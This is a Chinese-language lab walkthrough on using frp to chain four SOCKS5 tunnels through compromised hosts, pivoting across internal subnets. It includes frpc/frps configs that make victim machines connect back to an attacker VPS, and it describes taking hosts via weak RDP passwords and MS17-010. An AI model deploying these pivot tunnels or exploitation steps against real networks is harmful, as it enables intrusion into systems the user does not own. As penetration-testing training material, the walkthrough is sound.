---
title: Frp搭建多层内网通信隧道
published: 2025-04-16 09:39
tags: [安全, 内网穿透, FRP, 隧道]
category: 网安
draft: false
---

# Frp搭建多层内网通信隧道

## 0x01 什么是frp

```
frp 是一个专注于内网穿透的高性能的反向代理应用，支持 TCP、UDP、HTTP、HTTPS 等多种协议。可以将内网服务以安全、便捷的方式通过具有公网 IP 节点的中转暴露到公网。frp项目官网地址是：https://github.com/fatedier/frp/，下载解压后可以发现7个文件，frpc和frps分别为客户端和服务端可执行程序，frpc.ini和frps.ini，分别为客户端和服务端配置文件，frpc_full.ini和frps_full.ini分别为客户端所有配置项和服务端所有配置项。
```

## 0x02 配置文件

配置文件部分参数说明(更多参数说明，请参考官方文档)

```scss
frps：
[common]
bind_addr = 0.0.0.0  # 服务端监听地址
bind_port = 7000 # 服务端监听端口，默认7000
auth_token = xxxxxxxx # 验证凭据

frpc：
[common]
server_addr = x.x.x.x # 连接的服务器IP地址
server_port = 7000 # 连接的服务器端口

[http_proxy]
type = tcp # 连接类型为tcp
local_ip = x.x.x.x # 本地ip
local_port = 8888 # 本地监听端口
remote_port = 8888 # 远程服务器端口
use_encryption = true #启⽤加密
plugin = socks5  # 使⽤插件socks5代理
```

## 0x03 环境配置

**实验环境**

```scss
攻击机：
Vps：192.168.53.132
win10：192.168.53.129

受害机：
Debian：192.168.53.134  10.10.20.131
win7：10.10.20.129   10.10.30.130
win10：10.10.30.132  172.16.5.132
2008：172.16.5.129   172.16.10.128
```

![](/images/posts/frp-multi-layer-tunnel/1.png)

## 0x04 步骤

### 4.1 第一层隧道

假如我们在拿到Debian主机权限后，发现其存在第二张网卡为10.10.20.0/24网段的，但是攻击机没办法直接访问这个网段。

```scss
kali攻击机启动frps监听，配置文件如下：
[common]
bind_addr = 0.0.0.0
bind_port = 7000

Debian启动frpc，配置文件如下：
[common]
server_addr = 192.168.53.132  
server_port = 7000          

[http_proxy]
type = tcp
local_ip = 10.10.20.131
remote_port = 8888  
local_port = 8888
plugin = socks5
```

vps：

![](/images/posts/frp-multi-layer-tunnel/2.jpg)

debian：

![](/images/posts/frp-multi-layer-tunnel/3.jpg)

win10：

![](/images/posts/frp-multi-layer-tunnel/4.jpg)

此时我们便可以通过隧道去扫描10.10.20.0/24这个网段下的主机。

![](/images/posts/frp-multi-layer-tunnel/5.jpg)

### 4.2 第二层隧道

假如我们通过3389弱口令拿到10.10.20.129这台主机，但是经过查看后发现它还有第二个网段10.10.30.0/24，但是目前我们的隧道只能访问到10.10.20.0/24这个网段，遂需要搭建第二层通信隧道，这个时候Debian既是客户端，也是服务端。

```scss
Debian(frpc):
[common]
server_addr = 192.168.53.132  
server_port = 7000          

[http_proxy]
type = tcp
remote_port = 8888
local_ip = 10.10.20.131  
local_port = 8888      
plugin = socks5

Debian(frps):
[common]
bind_addr = 10.10.20.131
bind_port = 7000

Win 7(frpc):
[common]
server_addr = 10.10.20.131  
server_port = 7000          

[http_proxy]
type = tcp
local_ip = 10.10.30.130
remote_port = 8888    
local_port = 8888
plugin = socks5
```

debian：

![](/images/posts/frp-multi-layer-tunnel/6.jpg)

Win7：

![](/images/posts/frp-multi-layer-tunnel/7.jpg)

win10：

![](/images/posts/frp-multi-layer-tunnel/8.jpg)通过`fscan`扫描发现`10.10.30.132`这台主机存在`MS17-010`，且通过`MS17-010`拿下这台主机权限。

![](/images/posts/frp-multi-layer-tunnel/9.jpg)

![](/images/posts/frp-multi-layer-tunnel/10.jpg)

### 4.3 第三层隧道

现在我们又控制了PC这台主机，查看信息后，又发现了存在172.16.5.0/24这个网段，但是以目前条件kali攻击机没办法访问到这个网段下的资源，所以还要搭建第三层隧道，那么这个时候，Win7又多了一个身份，他既是客户端也是服务端。

```
kali和Debian配置不需要改动，Win7的frpc和frps配置参考上一条Debian配置，这边就不再次体现了，然后Win10的frpc配置参考上面的Win7的frpc配置
```

Win7：

![](/images/posts/frp-multi-layer-tunnel/11.jpg)

PC：

![](/images/posts/frp-multi-layer-tunnel/12.jpg)

Win10：

![](/images/posts/frp-multi-layer-tunnel/13.jpg)

通过fscan又发现存在一台ms17-010的机器，172.16.5.129，且通过17-010拿下这台机器。

![](/images/posts/frp-multi-layer-tunnel/14.jpg)

通过隧道成功登录到2008这台机器。

![](/images/posts/frp-multi-layer-tunnel/15.jpg)

### 4.4 第四层隧道

拿到172.16.5.129这台机器后，发现他又存在172.16.10.0/24这个网段，遂搭建第四层隧道，配置文件都差不多，自行修改。

PC：

![](/images/posts/frp-multi-layer-tunnel/16.jpg)

2008：

![](/images/posts/frp-multi-layer-tunnel/17.jpg)

Win10：

![](/images/posts/frp-multi-layer-tunnel/18.jpg)

通过`fscan`又发现存在一台`MS17-010`的机器`172.16.10.132`，且通过`MS17-010`拿下这台机器。

![](/images/posts/frp-multi-layer-tunnel/19.jpg)

![](/images/posts/frp-multi-layer-tunnel/20.jpg)

至此，所有主机全部都能登录。